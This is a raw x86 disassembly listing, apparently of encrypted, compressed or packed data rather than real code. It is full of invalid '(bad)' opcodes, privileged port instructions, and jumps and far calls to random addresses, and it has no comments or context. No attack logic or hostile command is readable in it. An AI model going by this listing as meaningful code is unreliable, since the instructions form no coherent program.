  4029c2:	mov    ecx,0xbf8ea313
  4029c7:	mov    bh,0xf8
  4029c9:	xor    DWORD PTR [eax-0x6398156c],ebx
  4029cf:	mov    eax,0x4b2e9c94
  4029d4:	sub    bl,al
  4029d6:	adc    esp,DWORD PTR [esi+0x542cf567]
  4029dc:	and    esi,DWORD PTR [ebp+0x6a]
  4029df:	test   al,0x18
  4029e1:	out    0xfb,al
  4029e3:	push   DWORD PTR [eax+esi*2]
  4029e6:	imul   eax,DWORD PTR [ebx],0x6e35e5cd
  4029ec:	sub    eax,0x5c238f2a
  4029f1:	in     al,dx
  4029f2:	pop    eax
  4029f3:	or     eax,0x79325366
  4029f8:	pusha  
  4029f9:	xor    eax,0xb43ac7da
  4029fe:	dec    edx
  4029ff:	jns    0x402a7f
  402a01:	cli    
  402a02:	dec    edx
  402a03:	and    BYTE PTR [esi+0x16],ah
  402a06:	(bad)  
  402a07:	jp     0x402a88
  402a09:	adc    eax,0xf8988fd9
  402a0e:	pop    esi
  402a0f:	leave  
  402a10:	call   0xf34f9bba
  402a15:	cmc    
  402a16:	adc    ah,BYTE PTR [edi+0xc5f74de]
  402a1c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  402a1e:	ret    0xe469
  402a21:	push   cs
  402a22:	or     al,0xd5
  402a24:	pop    ebx
  402a25:	ret    0xeaf6
  402a28:	dec    esi
  402a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a2a:	rol    BYTE PTR [edi-0x5e],1
  402a2d:	sbb    eax,0x6ddd962c
  402a32:	bound  eax,QWORD PTR [edi+0x4005fa51]
  402a38:	and    BYTE PTR [ecx-0x4bedaf25],bl
  402a3e:	test   BYTE PTR [eax+eax*4],0xba
  402a42:	mov    cl,ah
  402a44:	imul   ecx,DWORD PTR [ecx-0x3a],0xffffffbf
  402a48:	push   esi
  402a49:	xor    BYTE PTR [ebp-0x6e9d9df1],dh
  402a4f:	repnz xor ebx,DWORD PTR [ebx+ebp*1-0x30]
  402a54:	sub    ch,ah
  402a56:	cld    
  402a57:	addr16 mov dl,0xea
  402a5a:	call   0x51ff:0xe779737d
  402a61:	xor    BYTE PTR [edi-0x7b],0xe6
  402a65:	daa    
  402a66:	xchg   edi,eax
  402a67:	sub    DWORD PTR [esi+ecx*1+0xef2a857],edi
  402a6e:	mov    al,0xd1
  402a70:	pop    edx
  402a71:	xchg   esi,eax
  402a72:	jle    0x402a52
  402a74:	jmp    0x3ce817a5
  402a79:	cmc    
  402a7a:	jp     0x402a7d
  402a7c:	ins    DWORD PTR es:[edi],dx
  402a7d:	mov    eax,0xcb4d67a7
  402a82:	ret    
  402a83:	sub    DWORD PTR [ebx+0x3866b3f4],eax
  402a89:	pop    edi
  402a8a:	test   DWORD PTR [eax+0x12],esp
  402a8d:	push   esp
  402a8e:	ds xchg esp,eax
  402a90:	xor    eax,0x2ab63a6f
  402a95:	jae    0x402ac7
  402a97:	outs   dx,BYTE PTR ds:[esi]
  402a98:	sub    DWORD PTR gs:[esp+eax*4],esp
  402a9c:	inc    esp
  402a9d:	jecxz  0x402a3f
  402a9f:	xchg   DWORD PTR [esi-0x42],edi
  402aa2:	fucom  st(3)
  402aa4:	pop    eax
  402aa5:	loop   0x402a9a
  402aa7:	int    0x9b
  402aa9:	test   al,0x64
  402aab:	add    BYTE PTR [ecx],cl
  402aad:	sahf   
  402aae:	dec    ebx
  402aaf:	rcr    DWORD PTR [ebp+0x1ebfc329],1
  402ab5:	add    al,BYTE PTR ds:0xc183f414
  402abb:	jo     0x402a8e
  402abd:	xchg   DWORD PTR [ecx],edx
  402abf:	fistp  DWORD PTR [ebx-0xc]
  402ac2:	in     eax,0xe1
  402ac4:	mov    esp,0xab223451
  402ac9:	rcr    DWORD PTR [ebp-0x77ccd7a1],1
  402acf:	xchg   ebx,eax
  402ad0:	pop    ds
  402ad1:	xlat   BYTE PTR ds:[ebx]
  402ad2:	xchg   esp,eax
  402ad3:	push   esp
  402ad4:	mov    dh,0x93
  402ad6:	in     al,0x79
  402ad8:	retf   
  402ad9:	data16 stos BYTE PTR es:[edi],al
  402adb:	and    DWORD PTR [edx-0x27],ecx
  402ade:	xchg   edx,eax
  402adf:	ds or  eax,DWORD PTR fs:[edi+0x4a]
  402ae4:	push   esp
  402ae5:	push   ds
  402ae6:	and    al,0x66
  402ae8:	fsub   st,st(5)
  402aea:	jae    0x402b5b
  402aec:	(bad)  
  402aed:	imul   ebx,DWORD PTR [ebx+0x58d71ca],0xffffff9e
  402af4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402af5:	inc    edi
  402af6:	jg     0x402b26
  402af8:	fistp  QWORD PTR [ecx+ebx*8+0x6bc9ec1c]
  402aff:	mul    BYTE PTR [eax]
  402b01:	sub    bh,BYTE PTR [edi-0x53]
  402b04:	pop    ecx
  402b05:	jbe    0x402add
  402b07:	ss jnp 0x402b6e
  402b0a:	push   ecx
  402b0b:	stc    
  402b0c:	sbb    BYTE PTR [ecx],dl
  402b0e:	ds fucom st(2)
  402b11:	pop    edx
  402b12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b13:	cli    
  402b14:	pop    edx
  402b15:	stc    
  402b16:	in     eax,dx
  402b17:	lahf   
  402b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b19:	sbb    al,0x70
  402b1b:	and    al,0x16
  402b1d:	pop    ebp
  402b1e:	fldcw  WORD PTR [ecx]
  402b20:	mov    BYTE PTR [esi-0x4116a879],dh
  402b26:	push   ebx
  402b27:	mov    ebx,0x8a8309d
  402b2c:	test   BYTE PTR [edx+0x50],bl
  402b2f:	in     eax,0x26
  402b31:	in     al,0x12
  402b33:	inc    eax
  402b34:	mov    cl,0xbe
  402b36:	call   0x5f94:0xee6954f5
  402b3d:	mov    gs,WORD PTR [eax-0x7fd8c39d]
  402b43:	in     al,0xe
  402b45:	scas   eax,DWORD PTR es:[edi]
  402b46:	or     eax,edi
  402b48:	inc    ebx
  402b49:	dec    eax
  402b4a:	gs mov ebp,0x990164ef
  402b50:	test   DWORD PTR [eax-0x7aa64e1],ebp
  402b56:	dec    ecx
  402b57:	mov    bh,BYTE PTR [eax-0x7b]
  402b5a:	or     ebp,DWORD PTR [eax+0x5a9e9d95]
  402b60:	stos   BYTE PTR es:[edi],al
  402b61:	push   edi
  402b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b63:	mov    cl,0xbe
  402b65:	int3   
  402b66:	das    
  402b67:	or     al,0x86
  402b69:	bound  edx,QWORD PTR [edx+0x3d]
  402b6c:	mov    WORD PTR [edx],?
  402b6e:	out    0xdd,al
  402b70:	jbe    0x402b6b
  402b72:	ds out dx,eax
  402b74:	fwait
  402b75:	sbb    DWORD PTR [edi-0x36e6b65a],0xa
  402b7c:	fmul   QWORD PTR [eax+0x7c3ba509]
  402b82:	jmp    0x402b83
  402b84:	ficomp WORD PTR [edi]
  402b86:	adc    BYTE PTR [eax-0x2],ch
  402b89:	inc    eax
  402b8a:	je     0x402b80
  402b8c:	jmp    0x3c632b3b
  402b91:	jnp    0x402b54
  402b93:	test   eax,0x55e40c08
  402b98:	xor    DWORD PTR [esi+0x57546e18],edi
  402b9e:	idiv   DWORD PTR [eax+0x31]
  402ba1:	or     al,0xd8
  402ba3:	cwde   
  402ba4:	push   es
  402ba5:	arpl   WORD PTR [esi-0x3d226491],di
  402bab:	in     al,dx
  402bac:	or     BYTE PTR [ebx],0x3d
  402baf:	cmp    cl,al
  402bb1:	mov    ss,WORD PTR [eax-0x21]
  402bb4:	jmp    0x9e4f38f1
  402bb9:	mov    al,ds:0x604ef04b
  402bbe:	cdq    
  402bbf:	sbb    DWORD PTR [ecx-0x5f73e815],esp
  402bc5:	cmp    esp,DWORD PTR [eax-0x55641742]
  402bcb:	gs call 0x9b89:0x62cea061
  402bd3:	mov    ds:0xe01506a5,al
  402bd8:	test   eax,0xae0dfba
  402bdd:	push   edx
  402bde:	sub    al,0x7c
  402be0:	shl    DWORD PTR [edx-0x5b432b6c],cl
  402be6:	das    
  402be7:	sbb    esp,ecx
  402be9:	and    ebx,DWORD PTR [ecx+0xfd567ef]
  402bef:	test   al,0xc1
  402bf1:	lods   eax,DWORD PTR ds:[esi]
  402bf2:	jbe    0x402c41
  402bf4:	jo     0x402b76
  402bf6:	shl    esi,1
  402bf8:	jne    0x402b97
  402bfa:	inc    esp
  402bfb:	xlat   BYTE PTR ds:[ebx]
  402bfc:	inc    edx
  402bfd:	cmc    
  402bfe:	addr16 inc edx
  402c00:	push   es
  402c01:	jmp    0xadec2195
  402c06:	cli    
  402c07:	out    0xc7,eax
  402c09:	push   edi
  402c0a:	iret   
  402c0b:	sub    eax,0x809d66e1
  402c10:	test   DWORD PTR [eax],0x4341c212
  402c16:	push   edx
  402c17:	cmp    al,0xff
  402c19:	clc    
  402c1a:	inc    edi
  402c1b:	xor    ecx,eax
  402c1d:	push   eax
  402c1e:	sub    eax,edx
  402c20:	sub    BYTE PTR [eax],bh
  402c22:	and    BYTE PTR [edx+0x7a1199f0],al
  402c28:	adc    al,0xa9
  402c2a:	dec    ebx
  402c2b:	dec    eax
  402c2c:	jns    0x402c5e
  402c2e:	je     0x402c9a
  402c30:	(bad)
  402c34:	test   DWORD PTR [ecx],0x1132f4fa
  402c3a:	mov    ebp,0xa0829b7e
  402c3f:	push   0x877ecd0e
  402c44:	adc    al,0x28
  402c46:	or     eax,0x2e31668b
  402c4b:	mov    ecx,0xa190b084
  402c50:	sbb    eax,0x14edeb83
  402c55:	(bad)  
  402c56:	xor    DWORD PTR [ebp+0x3d8551ad],edi
  402c5c:	xor    ebx,eax
  402c5e:	cli    
  402c5f:	hlt    
  402c60:	lods   al,BYTE PTR ds:[esi]
  402c61:	call   0x1b84:0x65b54fd
  402c68:	push   edi
  402c69:	push   ss
  402c6a:	pop    ebx
  402c6b:	stos   DWORD PTR es:[edi],eax
  402c6c:	ret    0x922d
  402c6f:	xchg   ecx,eax
  402c70:	mov    dh,0x8f
  402c72:	and    DWORD PTR [ebx+edi*4],ebp
  402c75:	bnd ret 
  402c77:	cmp    dh,ah
  402c79:	add    eax,0x342e78db
  402c7e:	jno    0x402c48
  402c80:	ins    BYTE PTR es:[edi],dx
  402c81:	push   esi
  402c82:	push   ss
  402c83:	mov    bl,0x64
  402c85:	xor    cl,0x41
  402c88:	addr16 push cs
  402c8a:	xchg   ebp,eax
  402c8b:	xor    eax,0x97e3065d
  402c90:	and    bh,ch
  402c92:	mov    bh,0x2c
  402c94:	loop   0x402caf
  402c96:	iret   
  402c97:	sub    DWORD PTR [edi],0x4b
  402c9a:	not    DWORD PTR [edx+eax*1-0x18bcb992]
  402ca1:	push   eax
  402ca2:	stos   BYTE PTR es:[edi],al
  402ca3:	(bad)  
  402ca4:	adc    bh,BYTE PTR [ebx]
  402ca6:	add    bl,BYTE PTR [eax]
  402ca8:	cmp    BYTE PTR [ecx-0x535bc289],dl
  402cae:	ins    DWORD PTR es:[edi],dx
  402caf:	dec    ecx
  402cb0:	stos   BYTE PTR es:[edi],al
  402cb1:	mov    bh,0x89
  402cb3:	retf   
  402cb4:	fucomi st,st(2)
  402cb6:	inc    edx
  402cb7:	call   0x96716210
  402cbc:	pop    ss
  402cbd:	mov    edx,0xe01a94aa
  402cc2:	pop    ebp
  402cc3:	fsub   DWORD PTR [esi+0x110cd50d]
  402cc9:	adc    DWORD PTR [edi+0x71c41784],edi
  402ccf:	xor    edx,DWORD PTR [esi+0x2afe36a9]
  402cd5:	add    ch,cl
  402cd7:	lock or al,0xa8
  402cda:	and    DWORD PTR [esi],0x209c37c7
  402ce0:	and    ah,BYTE PTR [ebp-0x6d]
  402ce3:	dec    ebx
  402ce4:	test   ebx,edx
  402ce6:	and    cl,BYTE PTR [eax]
  402ce8:	rcl    DWORD PTR [esi+0x2f7de588],1
  402cee:	rcr    BYTE PTR [edx-0x1ba6f28e],0xbb
  402cf5:	mov    ah,0x17
  402cf7:	jns    0x402d76
  402cf9:	nop
  402cfa:	pop    esi
  402cfb:	lock scas al,BYTE PTR es:[edi]
  402cfd:	jle    0x402d43
  402cff:	inc    eax
  402d00:	jmp    DWORD PTR [ebx+0x648f94c0]
  402d06:	clc    
  402d07:	stos   BYTE PTR es:[edi],al
  402d08:	je     0x402d0e
  402d0a:	xchg   BYTE PTR [esi+edi*4+0x6e6ce3ef],al
  402d11:	int    0xbe
  402d13:	je     0x402d02
  402d15:	icebp  
  402d16:	mov    ah,0xf0
  402d18:	jnp    0x402d4a
  402d1a:	ret    0x4d30
  402d1d:	rcl    BYTE PTR [edx],cl
  402d1f:	fldenv [eax]
  402d21:	push   esi
  402d22:	xor    al,0x9b
  402d24:	enter  0xc867,0xb4
  402d28:	dec    esi
  402d29:	dec    ebx
  402d2a:	and    BYTE PTR [ecx+eiz*8],ch
  402d2d:	mov    eax,ds:0xba11a39e
  402d32:	dec    eax
  402d33:	out    0x9e,eax
  402d35:	jbe    0x402cfe
  402d37:	mov    bl,0x98
  402d39:	ds add eax,0x62d2a393
  402d3f:	mov    ecx,0xf6b7df67
  402d44:	xchg   ebp,eax
  402d45:	xchg   ecx,eax
  402d46:	test   DWORD PTR [eax+eax*8-0x3b907b91],esi
  402d4d:	retf   
  402d4e:	push   ebx
  402d4f:	ds push es
  402d51:	je     0x402d79
  402d53:	imul   edi,DWORD PTR [ecx],0x52554646
  402d59:	pop    edx
  402d5a:	pslld  mm0,QWORD PTR [ecx-0x6a]
  402d5e:	cmp    DWORD PTR [esi+0x4dbcf869],esi
  402d64:	clc    
  402d65:	sahf   
  402d66:	add    BYTE PTR [ebx-0x16],ch
  402d69:	out    dx,eax
  402d6a:	sbb    ebx,DWORD PTR [eax-0x6928b51c]
  402d70:	xchg   edx,eax
  402d71:	adc    DWORD PTR [edx+0x1ffc545d],0xa6083348
  402d7b:	mov    ecx,0x73796c93
  402d80:	pop    edi
  402d81:	xchg   esi,eax
  402d82:	pop    ss
  402d83:	jns    0x402d0a
  402d85:	loope  0x402d96
  402d87:	mov    esp,DWORD PTR ds:0x4327330e
  402d8d:	aad    0x7
  402d8f:	or     ch,BYTE PTR [ecx+0x35]
  402d92:	dec    eax
  402d93:	jmp    0x402d78
  402d95:	mov    eax,0xcbc4583e
  402d9a:	pop    esi
  402d9b:	sbb    ch,BYTE PTR [edx+0x285134fb]
  402da1:	cmp    DWORD PTR [eax+0x70],esp
  402da4:	pusha  
  402da5:	(bad)  
  402da6:	fsub   QWORD PTR [edx-0x6a]
  402da9:	retf   
  402daa:	add    eax,0xe7dd062b
  402daf:	aad    0x68
  402db1:	les    esp,FWORD PTR [eax+eiz*1+0x6c5b8783]
  402db8:	sbb    DWORD PTR [eax+esi*1+0x3d],ecx
  402dbc:	comiss xmm3,DWORD PTR [esi+0x31032142]
  402dc3:	adc    BYTE PTR [eax],cl
  402dc5:	mov    cs,WORD PTR [esi+0x52]
  402dc8:	pop    ebx
  402dc9:	pop    es
  402dca:	int3   
  402dcb:	mov    cl,0x12
  402dcd:	push   edi
  402dce:	sbb    esp,ecx
  402dd0:	data16 ss jne 0x402d78
  402dd4:	ins    DWORD PTR es:[edi],dx
  402dd5:	(bad)
  402dd9:	jp     0x402dc3
  402ddb:	cmc    
  402ddc:	nop
  402ddd:	adc    ebx,DWORD PTR [esi]
  402ddf:	push   0xffffffa4
  402de1:	scas   eax,DWORD PTR es:[edi]
  402de2:	mov    edi,0x4f114ceb
  402de7:	(bad)  
  402de8:	jg     0x402e4f
  402dea:	jns    0x402e42
  402dec:	xor    al,0x49
  402dee:	sbb    eax,0x35a507d1
  402df3:	jp     0x402e74
  402df5:	mov    esi,0x352d555f
  402dfa:	xchg   ebx,ebx
  402dfc:	outs   dx,DWORD PTR ds:[esi]
  402dfd:	xor    eax,0x40e5ab48
  402e02:	push   ebp
  402e03:	pop    ds
  402e04:	sbb    bl,BYTE PTR [edi]
  402e06:	es loope 0x402e35
  402e09:	jno    0x402e26
  402e0b:	div    bl
  402e0d:	jl     0x402e88
  402e0f:	fadd   DWORD PTR [edi+eax*8+0x6cce1d0e]
  402e16:	lods   eax,DWORD PTR ds:[esi]
  402e17:	iret   
  402e18:	hlt    
  402e19:	rol    ch,1
  402e1b:	cmp    BYTE PTR [edx],bl
  402e1d:	in     eax,dx
  402e1e:	into   
  402e1f:	or     al,0x9
  402e21:	ror    BYTE PTR [edx+0x2e],1
  402e24:	daa    
  402e25:	out    0xd6,al
  402e27:	dec    esi
  402e28:	xor    DWORD PTR [edx-0x21a846a2],ebx
  402e2e:	sub    al,0xbd
  402e30:	test   eax,ebp
  402e32:	mov    fs,WORD PTR [eax+0x7ce0434e]
  402e38:	imul   ebp,DWORD PTR [esi+0x50],0xffffffee
  402e3c:	xchg   esp,eax
  402e3d:	inc    esi
  402e3e:	xchg   ebp,eax
  402e3f:	dec    edx
  402e40:	pop    ecx
  402e41:	cmp    esp,DWORD PTR [edi-0x69]
  402e44:	or     DWORD PTR [edx+0x57],edi
  402e47:	inc    eax
  402e48:	inc    ecx
  402e49:	out    dx,al
  402e4a:	rcl    BYTE PTR [edx+0x77],0xf7
  402e4e:	imul   ecx,DWORD PTR [edi+0x311b852d],0xffffffdb
  402e55:	cmp    al,BYTE PTR [edx-0x7914be07]
  402e5b:	xchg   esi,eax
  402e5c:	(bad)  
  402e5e:	in     eax,dx
  402e5f:	and    al,0xfd
  402e61:	je     0x402e64
  402e63:	mov    cl,0xa7
  402e65:	jns    0x402e7c
  402e67:	mov    edi,0xe111156a
  402e6c:	lea    esi,[ebp+0x1a4f82f4]
  402e72:	test   dl,cl
  402e74:	lea    esi,[eax]
  402e76:	push   ebp
  402e77:	pop    ecx
  402e78:	xor    al,0x59
  402e7a:	mov    esi,0x467bca08
  402e7f:	addr16 dec esp
  402e81:	aas    
  402e82:	add    edx,edi
  402e84:	xchg   DWORD PTR [edi],eax
  402e86:	dec    ebx
  402e87:	aad    0x25
  402e89:	cld    
  402e8a:	mov    dh,BYTE PTR [edx+eax*1]
  402e8d:	sub    al,0xf
  402e8f:	inc    DWORD PTR [ebp+0x71c81ce7]
  402e95:	mov    ecx,0x58ae5b57
  402e9a:	pop    ecx
  402e9b:	inc    edx
  402e9c:	mov    dl,0x3c
  402e9e:	dec    eax
  402e9f:	repz bound eax,QWORD PTR [esi-0x24]
  402ea3:	inc    ebp
  402ea4:	mov    dl,BYTE PTR [esi-0x56]
  402ea7:	xor    edi,DWORD PTR [eax+edi*2+0x1d]
  402eab:	mov    ah,0x7a
  402ead:	xor    BYTE PTR [edx-0x1ebf7868],dh
  402eb3:	gs call 0xdc6f:0xd40d163b
  402ebb:	test   BYTE PTR [eax],bh
  402ebd:	jmp    0xfa8b1258
  402ec2:	mov    dl,0xba
  402ec4:	loopne 0x402eae
  402ec6:	ficom  WORD PTR [edi+ebx*4-0x7896afc4]
  402ecd:	adc    esi,ebx
  402ecf:	das    
  402ed0:	dec    edx
  402ed1:	mov    eax,0x4758f23d
  402ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ed7:	aaa    
  402ed8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ed9:	mov    ebx,0x2b7b2496
  402ede:	or     BYTE PTR [eax+0xaa4d61c],ah
  402ee4:	cmc    
  402ee5:	sub    al,0xb
  402ee7:	ja     0x402ed1
  402ee9:	in     eax,dx
  402eea:	in     eax,dx
  402eeb:	adc    BYTE PTR [ebp+0x35],0x6
  402eef:	sbb    ah,dl
  402ef1:	sbb    dl,BYTE PTR cs:[esi+0x77]
  402ef5:	inc    ecx
  402ef6:	xor    bh,BYTE PTR [ecx+0x63604311]
  402efc:	xor    DWORD PTR [ebx-0x7474ee55],ecx
  402f02:	jle    0x402f12
  402f04:	push   ecx
  402f05:	retf   0xa97a
  402f08:	call   0x71a995f2
  402f0d:	lea    eax,[ecx]
  402f0f:	add    eax,0x560e1e9c
  402f14:	sbb    DWORD PTR [ecx+0x1d],ecx
  402f17:	dec    ebx
  402f18:	sub    BYTE PTR [edi+0x7c],dl
  402f1b:	scas   al,BYTE PTR es:[edi]
  402f1c:	repz ja 0x402f2e
  402f1f:	mov    ebp,0xc758d691
  402f24:	shl    cl,1
  402f26:	shl    DWORD PTR [ecx+0x1bcfdf30],0xc9
  402f2d:	imul   eax,DWORD PTR [edx+0x45],0x4b
  402f31:	out    dx,al
  402f32:	aaa    
  402f33:	push   esi
  402f34:	adc    eax,0x6b75043d
  402f39:	add    al,0x65
  402f3b:	fcomp  DWORD PTR [ebx]
  402f3d:	arpl   WORD PTR [edx+0x1fe06fac],bx
  402f43:	cmp    ah,BYTE PTR [edi+edx*4+0x11]
  402f47:	dec    ecx
  402f48:	push   cs
  402f49:	jbe    0x402f1c
  402f4b:	addr16 mov ecx,0x727bb645
  402f51:	or     DWORD PTR [ebx+eiz*2+0xf6be1b],edi
  402f58:	push   esi
  402f59:	das    
  402f5a:	cdq    
  402f5b:	jo     0x402f55
  402f5d:	enter  0x6652,0x77
  402f61:	pop    edx
  402f62:	jo     0x402eeb
  402f64:	and    dl,ah
  402f66:	imul   esp,DWORD PTR [edi+0x3188f48f],0xffffffcc
  402f6d:	out    0xb4,eax
  402f6f:	int3   
  402f70:	pop    ebp
  402f71:	neg    edx
  402f73:	ins    BYTE PTR es:[edi],dx
  402f74:	test   DWORD PTR [ecx-0x7669f129],eax
  402f7a:	int3   
  402f7b:	cmp    al,0x6b
  402f7d:	mov    edx,0xb8931b4
  402f82:	xchg   BYTE PTR [ecx-0x2b],bh
  402f85:	inc    ebx
  402f86:	loope  0x402fce
  402f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f89:	arpl   cx,bp
  402f8b:	cld    
  402f8c:	xchg   edx,eax
  402f8d:	les    esp,FWORD PTR [esp+esi*4-0x35]
  402f91:	cmp    DWORD PTR [edi-0xb],esi
  402f94:	jb     0x402f8b
  402f96:	aas    
  402f97:	sub    al,0xef
  402f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f9a:	or     ebx,DWORD PTR [ebp+edi*4+0x1cf566be]
  402fa1:	sbb    DWORD PTR [ebx-0x37a24638],0x54
  402fa8:	and    al,0x6e
  402faa:	cwde   
  402fab:	mov    dl,0x6b
  402fad:	mov    ecx,0x397f495d
  402fb2:	(bad)  
  402fb3:	and    DWORD PTR [edx-0x6e],ebp
  402fb6:	adc    eax,ecx
  402fb8:	dec    ecx
  402fb9:	xchg   ecx,eax
  402fba:	push   0x16
  402fbc:	sbb    BYTE PTR [ecx+0x43a695d1],ah
  402fc2:	inc    esp
  402fc3:	jl     0x402fd8
  402fc5:	ins    BYTE PTR es:[edi],dx
  402fc6:	js     0x402fd1
  402fc8:	out    dx,eax
  402fc9:	hlt    
  402fca:	pop    edx
  402fcb:	test   DWORD PTR ds:0x931b4c28,ebx
  402fd1:	cld    
  402fd2:	push   0xffffff9c
  402fd4:	adc    al,0xe9
  402fd6:	or     al,0xc4
  402fd8:	loopne 0x402fae
  402fda:	das    
  402fdb:	or     BYTE PTR [esi],bh
  402fdd:	xchg   esi,eax
  402fde:	outs   dx,DWORD PTR ds:[esi]
  402fdf:	ret    0x644f
  402fe2:	loop   0x402fb6
  402fe4:	sahf   
  402fe5:	aad    0x53
  402fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fe8:	jmp    FWORD PTR [ebp-0x4c591a82]
  402fee:	aad    0x44
  402ff0:	leave  
  402ff1:	fldcw  WORD PTR [edi-0x6376ca89]
  402ff7:	pop    ss
  402ff8:	xchg   BYTE PTR [edi],bl
  402ffa:	pop    esi
  402ffb:	gs comiss xmm6,xmm2
  402fff:	sar    DWORD PTR [ebp-0x6e],0x70
  403003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403004:	out    dx,al
  403005:	retf   
  403006:	push   es
  403007:	inc    edi
  403008:	mov    bl,0x34
  40300a:	rcr    cl,0x5d
  40300d:	adc    BYTE PTR [ecx-0x834ea1c],ch
  403013:	push   cs
  403014:	fmul   QWORD PTR [ecx+0x1f]
  403017:	je     0x402fce
  403019:	pop    eax
  40301a:	daa    
  40301b:	psrad  mm7,QWORD PTR [ebx+0x10]
  40301f:	sbb    cl,BYTE PTR [ebp-0x74]
  403022:	int    0x1b
  403024:	cld    
  403025:	adc    eax,0x8404d144
  40302a:	xchg   ebx,eax
  40302b:	clc    
  40302c:	pop    ds
  40302d:	les    ebp,FWORD PTR [edi+0x2184f3e8]
  403033:	retf   0xae79
  403036:	dec    ebp
  403037:	ret    
  403038:	jge    0x4030a2
  40303a:	lods   al,BYTE PTR ds:[esi]
  40303b:	xlat   BYTE PTR gs:[ebx]
  40303d:	cdq    
  40303e:	ret    
  40303f:	xchg   ebx,eax
  403040:	inc    ecx
  403041:	sub    al,0x67
  403043:	push   esi
  403044:	dec    ebp
  403045:	pop    es
  403046:	stc    
  403047:	dec    edi
  403048:	aad    0xf8
  40304a:	mov    al,0xb9
  40304c:	test   al,0x92
  40304e:	xor    bl,cl
  403050:	dec    esi
  403051:	ins    DWORD PTR es:[edi],dx
  403052:	inc    ebp
  403053:	push   ds
  403054:	in     eax,dx
  403055:	cmc    
  403056:	rcl    BYTE PTR [ebx-0x1e],1
  403059:	dec    esi
  40305a:	retf   
  40305b:	out    dx,eax
  40305c:	ror    DWORD PTR [ebp+0x423868e4],1
  403062:	lock dec esi
  403064:	cmp    esp,ecx
  403066:	jbe    0x402fef
  403068:	pop    ds
  403069:	imul   ecx,DWORD PTR [ecx],0x7
  40306c:	not    BYTE PTR [edx]
  40306e:	pop    esp
  40306f:	sbb    BYTE PTR [ecx+0x7e],dl
  403072:	cdq    
  403073:	into   
  403074:	xchg   edx,ebx
  403076:	mov    ch,0x7a
  403078:	pop    eax
  403079:	mov    BYTE PTR [esi-0x3e],dl
  40307c:	jno    0x4030a1
  40307e:	mov    cl,BYTE PTR [esi-0x13]
  403081:	xor    DWORD PTR [ebx+ebp*4+0x55140b21],0x71
  403089:	in     eax,0xa0
  40308b:	dec    ebp
  40308c:	xchg   ebx,eax
  40308e:	dec    esp
  40308f:	mov    al,ds:0xbc0b8fcb
  403094:	ins    BYTE PTR es:[edi],dx
  403095:	inc    ecx
  403096:	aas    
  403097:	test   eax,0x1e993ace
  40309c:	adc    eax,0x87b55647
  4030a1:	clc    
  4030a2:	cwde   
  4030a3:	stos   BYTE PTR es:[edi],al
  4030a4:	jne    0x4030ca
  4030a6:	cli    
  4030a7:	cmc    
  4030a8:	push   ebx
  4030a9:	xchg   ecx,eax
  4030aa:	inc    edi
  4030ab:	lahf   
  4030ac:	and    edx,esp
  4030ae:	push   ds
  4030af:	call   DWORD PTR [esi+0x2b]
  4030b2:	pop    es
  4030b3:	or     ecx,DWORD PTR [ecx]
  4030b5:	(bad)  
  4030b6:	call   0x8014:0x970f8676
  4030bd:	iret   
  4030be:	js     0x403127
  4030c0:	stos   DWORD PTR es:[edi],eax
  4030c1:	mov    bl,0x39
  4030c3:	xor    al,0x34
  4030c5:	ja     0x403115
  4030c7:	lods   al,BYTE PTR ds:[esi]
  4030c8:	pop    ebp
  4030c9:	add    bl,al
  4030cb:	pop    edx
  4030cc:	mov    DWORD PTR [ecx],eax
  4030ce:	cdq    
  4030cf:	lea    ebx,[eax]
  4030d1:	sub    ebp,DWORD PTR ds:0xa33f487a
  4030d7:	icebp  
  4030d8:	dec    DWORD PTR [edi]
  4030da:	mov    bh,0xa8
  4030dc:	adc    DWORD PTR [ebx+0x7f399692],0x21
  4030e3:	xor    eax,0x87f001ec
  4030e8:	retf   0xf9ce
  4030eb:	jl     0x4030c0
  4030ed:	out    0xe3,al
  4030ef:	adc    edx,DWORD PTR [edi+0x33f872b5]
  4030f5:	icebp  
  4030f6:	jg     0x4030dc
  4030f8:	inc    eax
  4030f9:	sub    ebx,edx
  4030fb:	imul   edx,DWORD PTR [ebx-0x7d494606],0x6
  403102:	mov    al,ds:0x691efe63
  403107:	sahf   
  403108:	push   edi
  403109:	enter  0x5eb1,0xe9
  40310d:	mov    al,0x2c
  40310f:	xchg   esp,eax
  403110:	out    dx,eax
  403111:	loop   0x40315b
  403113:	cmp    al,0x2f
  403115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403116:	sub    DWORD PTR [ebx],esp
  403118:	scas   eax,DWORD PTR es:[edi]
  403119:	pop    ds
  40311a:	xchg   ebp,eax
  40311b:	stc    
  40311c:	test   eax,0xb3880959
  403121:	jnp    0x4031a2
  403123:	xchg   edx,eax
  403124:	and    DWORD PTR [edx-0x3],edi
  403127:	int3   
  403128:	or     ecx,ebx
  40312a:	add    BYTE PTR [esp],bh
  40312d:	push   edx
  40312e:	jge    0x40310d
  403130:	pop    esp
  403131:	cmp    BYTE PTR ds:0xca4c1730,al
  403137:	(bad)  [ebx+esi*8-0x80]
  40313b:	adc    DWORD PTR [ecx],ecx
  40313d:	(bad)  
  40313e:	aam    0x46
  403140:	pop    ecx
  403141:	jge    0x403115
  403143:	or     al,0xeb
  403145:	rcr    cl,cl
  403147:	(bad)  
  403148:	push   esi
  403149:	ins    BYTE PTR es:[edi],dx
  40314a:	int3   
  40314b:	or     al,0x63
  40314d:	idiv   DWORD PTR [edx]
  40314f:	loop   0x403169
  403151:	add    ah,BYTE PTR [eax+0x7748350a]
  403157:	hlt    
  403158:	fadd   st,st(3)
  40315a:	jmp    0xa9458685
  40315f:	xor    al,0x28
  403161:	pop    esp
  403162:	lea    ebx,[edi+0x7ad08316]
  403168:	jo     0x4031cc
  40316a:	adc    BYTE PTR [edx+0x33230d1e],al
  403170:	jmp    0x6c5f:0xa06c2616
  403177:	xchg   edi,eax
